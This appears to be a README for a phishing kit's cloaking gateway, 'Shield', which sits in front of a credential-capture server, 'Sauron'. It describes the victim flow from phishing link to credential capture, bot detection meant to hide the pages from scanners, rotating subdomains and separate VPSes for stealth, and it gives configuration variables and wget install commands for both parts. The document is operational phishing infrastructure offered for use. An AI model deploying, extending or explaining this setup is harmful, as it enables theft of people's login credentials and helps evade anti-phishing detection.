# Shield Gateway - Standalone Architecture

## Overview

Shield is now a **completely standalone application** that operates independently from Sauron on its own VPS. This architecture provides maximum stealth, security, and operational flexibility.

## Architecture

```
User → Shield VPS (Bot Detection) → Sauron VPS (Credential Capture)
       Port 443                      Port 443
       shield-domain.com             sauron-domain.com
```

## Key Features

- **Independent Deployment**: Shield runs on its own VPS instance
- **Secure Communication**: Private API communication between Shield and Sauron
- **Subdomain Rotation**: Multiple rotating subdomains for enhanced stealth
- **IP Whitelisting**: Production-grade security with configurable access control
- **Auto-Generated Keys**: 64-character SHIELD_KEY for authentication

## Communication Flow

1. **User Access**: User clicks phishing link → Shield domain
2. **Bot Detection**: Shield runs advanced bot detection (Canvas, WebGL, behavioral analysis)
3. **API Validation**: Shield queries Sauron via internal API to validate slug/sublink
4. **User Redirect**: Legitimate users redirected to Sauron for credential capture

## Security

### Authentication
- **SHIELD_KEY**: 64-character auto-generated key shared between Shield and Sauron
- **IP Whitelisting**: Only Shield VPS IP allowed in production mode
- **Private Network**: Internal API communication invisible to end users

### Endpoints
- `/shield/validate` - Validates slugs and sublinks
- `/shield/ping` - Health check endpoint

## Configuration

### Environment Variables

**Shield VPS:**
```bash
SHIELD_DOMAIN=your-shield-domain.com
SAURON_INTERNAL_URL=https://10.0.0.4  # Sauron's private IP
SAURON_PUBLIC_URL=https://sauron-domain.com  # For user redirects
SHIELD_KEY=<same-as-sauron>  # Must match Sauron's key
SHIELD_TURNSTILE_SITE_KEY=your_site_key
SHIELD_TURNSTILE_SECRET=your_secret
SHIELD_CLOUDFLARE_TOKEN=your_token
DEV_MODE=false
```

**Sauron VPS:**
```bash
SAURON_DOMAIN=sauron-domain.com
SHIELD_DOMAIN=your-shield-domain.com
SHIELD_INTERNAL_IP=10.0.0.5  # Shield VPS IP
SHIELD_KEY=<same-as-shield>  # Must match Shield's key
```

## Deployment

### Shield VPS
```bash
# Download and install Shield
wget https://github.com/YourRepo/Shield/releases/latest/download/shield-linux-amd64.tar.gz
tar -xzf shield-linux-amd64.tar.gz && cd shield
sudo ./install/install-production.sh
```

### Sauron VPS
```bash
# Download and install Sauron
wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz
tar -xzf sauron-linux-amd64.tar.gz && cd sauron
sudo ./install/install-production.sh
```

## Testing

### Connection Verification
```bash
# On Sauron VPS
./scripts/test-shield-connection.sh

# On Shield VPS
./bin/test-sauron-connection.sh
```

Both tests must pass before the system is operational.

## Benefits

- **Enhanced Stealth**: Separate VPS instances reduce detection risk
- **Scalability**: Independent scaling of Shield and Sauron
- **Security**: Private network communication with IP whitelisting
- **Maintenance**: Independent updates and maintenance cycles
- **Flexibility**: Deploy on different providers or regions

## Migration from Co-located

If migrating from the old co-located architecture:

1. Deploy Shield on new VPS
2. Update Sauron configuration with Shield VPS IP
3. Test connection between both VPSes
4. Update DNS to point to Shield VPS
5. Decommission old co-located setup

## Troubleshooting

### Common Issues

1. **Connection Failed**: Check SHIELD_KEY matches on both VPSes
2. **IP Blocked**: Verify SHIELD_INTERNAL_IP is correct
3. **SSL Issues**: Ensure both VPSes have valid certificates
4. **DNS Issues**: Verify Shield domain points to Shield VPS

### Debug Commands

```bash
# Check Shield service
sudo systemctl status shield

# View Shield logs
sudo journalctl -u shield -f

# Test Sauron connectivity from Shield
./bin/test-sauron-connection.sh
```

## Support

For Shield-specific issues, refer to the Shield repository documentation or contact support.
